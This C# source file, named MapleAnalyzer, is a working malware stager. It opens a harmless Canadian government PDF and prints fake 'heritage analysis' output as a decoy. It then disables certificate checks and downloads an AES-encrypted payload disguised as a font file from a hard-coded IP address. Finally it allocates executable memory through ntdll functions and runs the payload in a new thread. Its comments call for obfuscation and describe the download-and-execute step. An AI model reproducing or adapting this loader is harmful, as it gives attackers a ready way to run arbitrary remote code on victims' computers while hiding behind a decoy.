using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.IO;
using System.Security.Cryptography;

namespace MapleAnalyzer
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t"; // Obfuscate if needed
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://100.87.7.97:8081/test1.woff";

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref ulong RegionSize,
            uint AllocationType,
            uint Protect
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtCreateThreadEx(
            out IntPtr ThreadHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartAddress,
            IntPtr Parameter,
            bool CreateSuspended,
            int StackZeroBits,
            int SizeOfStackCommit,
            int SizeOfStackReserve,
            IntPtr BytesBuffer
        );

        public static void DownloadDataAndProcess()
        {
            SimulateCanadianAnalysis();
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            WebClient client = new WebClient();
            byte[] shellcode = client.DownloadData(url);

            byte[] actualShellcode = new byte[shellcode.Length - 16];
            Array.Copy(shellcode, 16, actualShellcode, 0, actualShellcode.Length);

            byte[] decrypted = Decrypt(actualShellcode, AESKey, AESIV);

            ExecuteShellcode(decrypted);
        }

        public static void ExecuteShellcode(byte[] shellcode)
        {
            IntPtr baseAddress = IntPtr.Zero;
            ulong regionSize = (ulong)shellcode.Length;

            IntPtr ntAllocateVirtualMemoryAddr = ResolveSyscall("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory ntAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(ntAllocateVirtualMemoryAddr);

            ntAllocateVirtualMemory(
                (IntPtr)(-1), ref baseAddress, IntPtr.Zero, ref regionSize,
                0x3000, 0x40 // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            );

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            IntPtr ntCreateThreadExAddr = ResolveSyscall("NtCreateThreadEx");
            NtCreateThreadEx ntCreateThreadEx = Marshal.GetDelegateForFunctionPointer<NtCreateThreadEx>(ntCreateThreadExAddr);

            IntPtr threadHandle;
            ntCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, (IntPtr)(-1),
                baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (var aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                using (var decryptor = aesAlg.CreateDecryptor())
                using (var msDecrypt = new MemoryStream(ciphertext))
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    byte[] decrypted = new byte[ciphertext.Length];
                    csDecrypt.Read(decrypted, 0, decrypted.Length);
                    return decrypted;
                }
            }
        }

        public static IntPtr ResolveSyscall(string functionName)
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            return GetProcAddress(ntdll, functionName);
        }

        public static void SimulateCanadianAnalysis()
        {
            Console.WriteLine("Analyzing Canadian cultural artifacts...");
            string[] items = { "Maple Syrup", "Hockey Puck", "Toque", "Moose Antler", "Poutine Bowl" };
            Random rnd = new Random();

            foreach (var item in items)
            {
                int quality = rnd.Next(1, 100);
                Console.WriteLine($"Item: {item}, Cultural Quality Index: {quality}");
            }

            Console.WriteLine("Running Canadian heritage analysis...");
            double[] mockResults = new double[5];
            for (int i = 0; i < mockResults.Length; i++)
            {
                mockResults[i] = Math.Log(i + 2) * rnd.Next(5, 15);
                Console.WriteLine($"Result {i + 1}: {mockResults[i]:0.00} Heritage Units");
            }

            Console.WriteLine("Analysis complete. True north strong and free.");
        }

        public static void OpenDocument()
        {
            string pdfurl = "https://food-guide.canada.ca/static/assets/pdf/CDG-EN-2018.pdf";
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = pdfurl,
                    UseShellExecute = true
                });
                Console.WriteLine("Canadian Food Guide opened successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to open Canadian PDF: {ex.Message}");
            }
        }

        public static void Main(string[] args)
        {
            OpenDocument();             // Open a benign Canadian PDF
            SimulateCanadianAnalysis(); // Simulate data analysis on Canadian items
            DownloadDataAndProcess();   // Download & execute encrypted payload
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
